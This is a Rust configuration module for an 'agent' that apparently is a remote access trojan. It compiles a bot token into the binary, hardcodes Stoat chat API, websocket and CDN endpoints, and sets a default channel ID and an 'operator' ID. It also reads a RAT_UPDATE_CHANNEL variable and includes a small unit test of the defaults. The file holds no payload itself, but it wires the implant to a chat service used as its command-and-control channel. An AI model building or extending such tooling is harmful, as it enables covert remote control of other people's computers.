// language: Rust, file: src/config.rs
// Agent config — resolved from config.json beside the exe, then env overrides.
#![allow(dead_code)]
use anyhow::{bail, Result};
use serde::Deserialize;

#[derive(Clone, Deserialize)]
#[serde(default)]
pub struct Config {
    pub token: String,
    pub api: String,
    pub ws: String,
    pub autumn: String,
    pub channel: Option<String>,
    pub operator: Option<String>,
    pub update_channel: Option<String>,
    pub prefix: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            token: include_str!("../agent.secret").trim().to_string(),
            api: "https://api.stoat.chat".into(),
            ws: "wss://events.stoat.chat".into(),
            autumn: "https://cdn.stoatusercontent.com".into(),
            channel: Some("01M3F2Y7FHE835WGFP7AE5C9T6".into()),
            operator: Some("01KY5TFB0N9GDDPMH6G44GMH6P".into()),
            update_channel: None,
            prefix: "!".into(),
        }
    }
}

impl Config {
    pub fn load() -> Result<Self> {
        let mut cfg = Config::default();
        let mut loaded = false;
        // 1. config.json in the current working directory
        if let Ok(cwd) = std::env::current_dir() {
            let p = cwd.join("config.json");
            if p.exists() {
                cfg = serde_json::from_str(&std::fs::read_to_string(&p)?)?;
                loaded = true;
            }
        }
        // 2. config.json beside the executable
        if !loaded {
            if let Ok(exe) = std::env::current_exe() {
                let p = exe.with_file_name("config.json");
                if p.exists() {
                    cfg = serde_json::from_str(&std::fs::read_to_string(&p)?)?;
                }
            }
        }
        if let Ok(v) = std::env::var("STOAT_TOKEN") {
            if !v.is_empty() {
                cfg.token = v;
            }
        }
        if let Ok(v) = std::env::var("STOAT_API") {
            if !v.is_empty() {
                cfg.api = v;
            }
        }
        if let Ok(v) = std::env::var("STOAT_WS") {
            if !v.is_empty() {
                cfg.ws = v;
            }
        }
        if let Ok(v) = std::env::var("STOAT_AUTUMN") {
            if !v.is_empty() {
                cfg.autumn = v;
            }
        }
        if let Ok(v) = std::env::var("STOAT_CHANNEL") {
            if !v.is_empty() {
                cfg.channel = Some(v);
            }
        }
        if let Ok(v) = std::env::var("STOAT_OPERATOR") {
            if !v.is_empty() {
                cfg.operator = Some(v);
            }
        }
        if let Ok(v) = std::env::var("RAT_UPDATE_CHANNEL") {
            if !v.is_empty() {
                cfg.update_channel = Some(v);
            }
        }
        if cfg.token.is_empty() {
            bail!("no Stoat bot token configured");
        }
        Ok(cfg)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_point_at_stoat_endpoints() {
        let c = Config::default();
        assert_eq!(c.api, "https://api.stoat.chat");
        assert_eq!(c.ws, "wss://events.stoat.chat");
        assert!(c.autumn.starts_with("https://"));
        assert_eq!(c.prefix, "!");
        assert!(!c.token.is_empty());
    }
}
